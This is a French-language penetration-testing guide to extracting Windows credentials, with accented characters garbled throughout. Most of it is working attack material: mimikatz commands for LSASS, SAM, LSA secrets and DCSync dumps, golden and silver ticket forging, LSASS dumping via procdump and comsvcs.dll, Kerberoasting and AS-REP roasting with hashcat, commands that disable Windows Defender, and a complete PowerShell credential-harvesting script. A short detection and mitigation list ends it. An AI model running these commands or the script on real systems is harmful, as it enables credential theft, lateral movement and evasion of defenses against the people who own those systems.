# Windows Credentials

## üîê Vue d'ensemble

L'extraction de credentials sur Windows est une **√©tape critique** de la post-exploitation. Windows stocke les credentials dans plusieurs endroits : m√©moire (LSASS), registre (SAM), cache (LSA secrets), et bases Active Directory. Ma√Ætriser ces techniques permet un mouvement lat√©ral efficace.

> **üí° Explication Simple** : Windows garde tous les mots de passe dans des "coffres-forts" num√©riques. Si on trouve les cl√©s de ces coffres-forts, on peut ouvrir toutes les portes du r√©seau sans forcer !

## üéØ Types de Credentials Windows

### 1. **NTLM Hashes**
**Le plus courant** - Hash des mots de passe utilisateurs

### 2. **Plaintext Passwords** 
**Le plus utile** - Mots de passe en clair (WDigest, etc.)

### 3. **Kerberos Tickets**
**Pour Active Directory** - Tickets TGT/TGS pour SSO

### 4. **LSA Secrets**
**Comptes de service** - Mots de passe des services syst√®me

### 5. **Cached Credentials**
**Domaine offline** - Credentials cach√©s pour connexion hors ligne

## üß† Stockage des Credentials Windows

### LSASS (Local Security Authority Subsystem Service)
**EN M√âMOIRE** - Le processus qui g√®re l'authentification
```
- Plaintext passwords (WDigest enabled)
- NTLM hashes  
- Kerberos tickets (TGT/TGS)
- LSA secrets
```

### SAM (Security Account Manager)
**DANS LE REGISTRE** - Base locale des comptes utilisateurs
```
- Local user accounts
- NTLM hashes of local passwords
- Built-in accounts (Administrator, Guest)
```

### LSA (Local Security Authority)
**DANS LE REGISTRE** - Secrets du syst√®me local
```
- Service account passwords
- Auto-logon credentials  
- Cached domain credentials
- Machine account password
```

## ü•∑ Mimikatz - L'Outil de R√©f√©rence

### Installation et Bases
```powershell
# 1. Download et ex√©cution
# https://github.com/gentilkiwi/mimikatz/releases
.\mimikatz.exe

# 2. √âlever les privil√®ges dans mimikatz
mimikatz # privilege::debug
mimikatz # token::elevate

# 3. V√©rifier les privil√®ges
mimikatz # privilege::debug
# Should return: "Privilege '20' OK"
```

### Extraction de Mots de Passe en Clair
```powershell
# 1. Activer WDigest (si d√©sactiv√©) - N√©cessite reboot
mimikatz # sekurlsa::wdigest

# 2. Forcer le stockage en plaintext (Windows 8.1+)
reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1

# 3. Extraire les passwords en clair
mimikatz # sekurlsa::logonpasswords

# R√©sultat type :
# Authentication Id : 0 ; 1234567
# Session           : Interactive from 1
# User Name         : admin
# Domain            : WORKGROUP  
# Logon Server      : WORKSTATION
# Logon Time        : 1/1/2024 10:00:00 AM
# SID               : S-1-5-21-...
#         msv :
#                 [00000003] Primary
#                 * Username : admin
#                 * Domain   : WORKGROUP
#                 * NTLM     : a87f3a337d73085c45f9416be5787d86
#                 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
#         wdigest :
#                 * Username : admin
#                 * Domain   : WORKGROUP  
#                 * Password : Password123!
```

### Extraction de Hashes NTLM
```powershell
# 1. Dump tous les hashes NTLM en m√©moire
mimikatz # sekurlsa::logonpasswords

# 2. Dump SAM (local accounts)
mimikatz # lsadump::sam

# 3. Dump les secrets LSA
mimikatz # lsadump::secrets

# 4. Cache dump (credentials de domaine cach√©s)
mimikatz # lsadump::cache

# 5. Export vers fichier
mimikatz # sekurlsa::logonpasswords full > passwords.txt
```

### Kerberos Tickets
```powershell
# 1. Lister tous les tickets Kerberos
mimikatz # sekurlsa::tickets

# 2. Export des tickets TGT/TGS
mimikatz # sekurlsa::tickets /export

# 3. Pass-the-ticket (utiliser un ticket vol√©)
mimikatz # kerberos::ptt ticket.kirbi

# 4. Golden ticket (si krbtgt hash disponible)
mimikatz # kerberos::golden /domain:company.com /sid:S-1-5-21-... /rc4:[krbtgt_hash] /user:administrator

# 5. Silver ticket (pour un service sp√©cifique)
mimikatz # kerberos::golden /domain:company.com /sid:S-1-5-21-... /target:server.company.com /service:cifs /rc4:[service_hash] /user:administrator
```

## üîß Mimikatz via Meterpreter

### Chargement du Module Kiwi
```bash
# Dans une session meterpreter
meterpreter > load kiwi
meterpreter > help kiwi

# Commandes disponibles :
# creds_all           - Retrieve all credentials
# creds_kerberos      - Retrieve Kerberos creds
# creds_livessp       - Retrieve Live SSP creds  
# creds_msv           - Retrieve MSV creds
# creds_ssp           - Retrieve SSP creds
# creds_tspkg         - Retrieve TsPkg creds
# creds_wdigest       - Retrieve WDigest creds
```

### Extraction Automatis√©e avec Kiwi
```bash
# 1. Dump de tous les credentials
meterpreter > creds_all

# 2. Types sp√©cifiques
meterpreter > creds_wdigest      # Passwords en clair
meterpreter > creds_msv          # NTLM hashes
meterpreter > creds_kerberos     # Tickets Kerberos

# 3. Dump SAM et LSA
meterpreter > lsa_dump_sam       # Local SAM
meterpreter > lsa_dump_secrets   # LSA secrets

# 4. Golden ticket creation
meterpreter > golden_ticket_create -d company.com -k [krbtgt_hash] -s [domain_sid] -u administrator -t /tmp/golden.ticket
```

## üõ†Ô∏è Techniques Alternatives (Sans Mimikatz)

### PowerShell et PowerSploit
```powershell
# 1. Invoke-Mimikatz (PowerSploit)
powershell -ep bypass
Import-Module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'

# 2. Out-Minidump (dump LSASS)
Get-Process lsass | Out-Minidump -DumpFilePath C:\temp\lsass.dmp

# 3. Invoke-PowerDump (SAM dump)
Invoke-PowerDump
```

### Procdump + Offline Analysis
```bash
# 1. Sur la victime - Dump LSASS process
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# 2. Transfer du dump vers machine d'analyse
# Via SMB, HTTP, etc.

# 3. Analyse offline avec mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### Reg.exe pour SAM/System
```cmd
# 1. Export des ruches de registre
reg save HKLM\SAM sam.hive
reg save HKLM\SYSTEM system.hive
reg save HKLM\SECURITY security.hive

# 2. Transfer et crack offline
# Utiliser samdump2, pwdump, ou impacket

# 3. Avec impacket
secretsdump.py -sam sam.hive -system system.hive LOCAL
```

## üîç Hunting for Credentials

### Recherche dans les Fichiers
```powershell
# 1. Recherche de fichiers contenant des passwords
findstr /si "password" *.txt *.xml *.config *.ini
findstr /si "pass" *.txt *.xml *.config *.ini  
findstr /si "pwd" *.txt *.xml *.config *.ini

# 2. Fichiers de configuration sp√©cifiques
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\inetpub\wwwroot\web.config
dir /s *pass* == *cred* == *vnc* == *.config*

# 3. Registre pour auto-logon
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKCU\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

### Recherche dans la M√©moire des Processus
```powershell
# 1. Strings dans la m√©moire des processus
# Utiliser ProcessHacker ou ProcDump
strings64.exe -pid [process_id] | findstr /i "password"

# 2. Browser credentials
# Chrome
type "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data"

# Firefox  
type "%APPDATA%\Mozilla\Firefox\Profiles\*.default\logins.json"

# Internet Explorer
rundll32.exe keymgr.dll,KRShowKeyMgr
```

### PowerShell History et Logs
```powershell
# 1. PowerShell command history
type %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# 2. PowerShell transcripts (if enabled)
dir C:\Transcripts\ /s

# 3. Event logs pour credentials
wevtutil qe Security /q:"*[System[EventID=4624]]" /f:text | findstr /i "password"
```

## üåê Active Directory Credentials

### DCSync Attack
```powershell
# 1. Avec mimikatz (si droits DCSync)
mimikatz # lsadump::dcsync /domain:company.com /user:Administrator

# 2. Avec impacket
secretsdump.py company.com/administrator:password@dc.company.com

# 3. Dump de tous les hashes du domaine
mimikatz # lsadump::dcsync /domain:company.com /all /csv
```

### Kerberoasting
```powershell
# 1. √ânum√©ration des comptes de service
setspn -Q */*

# 2. Request TGS tickets
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "HTTP/server.company.com"

# 3. Export et crack des tickets
Invoke-Kerberoast -OutputFormat Hashcat | fl
hashcat -m 13100 kerberos_hashes.txt rockyou.txt

# 4. Avec impacket
GetUserSPNs.py company.com/user:password -dc-ip dc_ip -request
```

### AS-REP Roasting
```powershell
# 1. Enum√©ration des comptes sans pr√©-auth Kerberos
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth

# 2. Avec impacket
GetNPUsers.py company.com/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# 3. Crack des hashes AS-REP
hashcat -m 18200 asrep_hashes.txt rockyou.txt
```

## üîì Techniques de Bypass

### Bypass AV/EDR
```powershell
# 1. Mimikatz obfusqu√©
# Utiliser Invoke-Obfuscation
Invoke-Obfuscation -Command "Invoke-Mimikatz"

# 2. Mimikatz en m√©moire seulement
# PowerShell Empire, Cobalt Strike

# 3. LSASS dump via WMI
wmic process call create "rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump [lsass_pid] C:\temp\lsass.dmp full"

# 4. Alternatives √† mimikatz
# Rubeus pour Kerberos
.\Rubeus.exe dump /nowrap

# SharpDPAPI pour DPAPI
.\SharpDPAPI.exe machinecredentials
```

### Bypass Windows Defender
```powershell
# 1. Exclusions temporaires (si admin)
Add-MpPreference -ExclusionPath "C:\temp"
Add-MpPreference -ExclusionProcess "mimikatz.exe"

# 2. Disable Real-time protection
Set-MpPreference -DisableRealtimeMonitoring $true

# 3. Use encoded/encrypted mimikatz
# Base64 encode mimikatz binary
certutil -encode mimikatz.exe mimikatz.b64
certutil -decode mimikatz.b64 mimikatz_decoded.exe
```

## üìã Checklist Credential Harvesting

### ‚úÖ Reconnaissance :
1. **Current user privileges** - Administrator, SYSTEM ?
2. **Security products** - AV, EDR d√©tect√©s ?
3. **Domain environment** - Workgroup ou Active Directory ?
4. **Logged users** - Qui d'autre est connect√© ?
5. **Running processes** - Services int√©ressants ?

### ‚úÖ Memory Extraction :
1. **LSASS process access** - Peut-on acc√©der √† LSASS ?
2. **WDigest enabled** - Passwords en clair disponibles ?
3. **Kerberos tickets** - TGT/TGS en m√©moire ?
4. **Alternative dumps** - Procdump, WMI, PowerShell ?
5. **Offline analysis** - Transfer pour analyse ?

### ‚úÖ Registry/Files :
1. **SAM/SYSTEM** - Export possible ?
2. **LSA secrets** - Service accounts ?
3. **Auto-logon** - Credentials stock√©s ?
4. **Configuration files** - web.config, app.config ?
5. **Browser credentials** - Passwords sauvegard√©s ?

### ‚úÖ Active Directory :
1. **Domain privileges** - DCSync rights ?
2. **Service accounts** - Kerberoasting possible ?
3. **Pre-auth disabled** - AS-REP roasting ?
4. **Cached credentials** - Domain creds offline ?
5. **Trust relationships** - Cross-domain access ?

## üéì Scripts d'Automatisation

### PowerShell Credential Harvester
```powershell
# Comprehensive credential harvesting script
function Invoke-CredentialHarvest {
    Write-Host "[+] Starting credential harvest..." -ForegroundColor Green
    
    # Check privileges
    $currentUser = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentUser)
    $isAdmin = $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
    
    Write-Host "[+] Current user: $($currentUser.Name)" -ForegroundColor Yellow
    Write-Host "[+] Is Administrator: $isAdmin" -ForegroundColor Yellow
    
    # SAM/SYSTEM export if admin
    if ($isAdmin) {
        Write-Host "[+] Attempting SAM/SYSTEM export..." -ForegroundColor Green
        reg save HKLM\SAM sam.hive 2>$null
        reg save HKLM\SYSTEM system.hive 2>$null
        if (Test-Path "sam.hive") {
            Write-Host "[+] SAM/SYSTEM exported successfully" -ForegroundColor Green
        }
    }
    
    # Auto-logon credentials
    Write-Host "[+] Checking auto-logon credentials..." -ForegroundColor Green
    $autologon = Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -ErrorAction SilentlyContinue
    if ($autologon.DefaultUserName) {
        Write-Host "[+] Auto-logon found: $($autologon.DefaultUserName):$($autologon.DefaultPassword)" -ForegroundColor Red
    }
    
    # PowerShell history
    Write-Host "[+] Checking PowerShell history..." -ForegroundColor Green
    $historyPath = "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
    if (Test-Path $historyPath) {
        $history = Get-Content $historyPath | Select-String "password|pwd|pass" -CaseSensitive:$false
        if ($history) {
            Write-Host "[+] Credentials found in PowerShell history" -ForegroundColor Red
            $history | ForEach-Object { Write-Host "    $_" -ForegroundColor Yellow }
        }
    }
    
    # Configuration files
    Write-Host "[+] Searching configuration files..." -ForegroundColor Green
    $configFiles = Get-ChildItem -Path C:\ -Include *.config,*.xml,*.ini -Recurse -ErrorAction SilentlyContinue | 
                   Select-String "password|pwd|pass" -CaseSensitive:$false | 
                   Select-Object -First 10
    
    if ($configFiles) {
        Write-Host "[+] Credentials found in config files" -ForegroundColor Red
        $configFiles | ForEach-Object { Write-Host "    $($_.Filename):$($_.LineNumber) - $($_.Line.Trim())" -ForegroundColor Yellow }
    }
    
    Write-Host "[+] Credential harvest completed" -ForegroundColor Green
}

Invoke-CredentialHarvest
```

## ‚ö†Ô∏è D√©tection et Mitigation

### üö® Signes de Credential Harvesting
- **LSASS process access** - Acc√®s inhabituel au processus LSASS
- **Registry exports** - Export des ruches SAM/SYSTEM/SECURITY
- **Mimikatz artifacts** - Signatures connues de mimikatz
- **Unusual process dumps** - Dumps de processus sensibles
- **Kerberos anomalies** - Requests TGS inhabituels

### üõ°Ô∏è Protections
- **Credential Guard** - Protection hardware des credentials
- **LSA Protection** - Protection renforc√©e de LSASS
- **WDigest disabled** - Pas de passwords en clair
- **Privileged Access Workstations** - Postes admin isol√©s
- **Regular password rotation** - Rotation fr√©quente

---
*Cette section couvre l'extraction compl√®te de credentials Windows. Utiliser uniquement dans un cadre l√©gal autoris√©.* 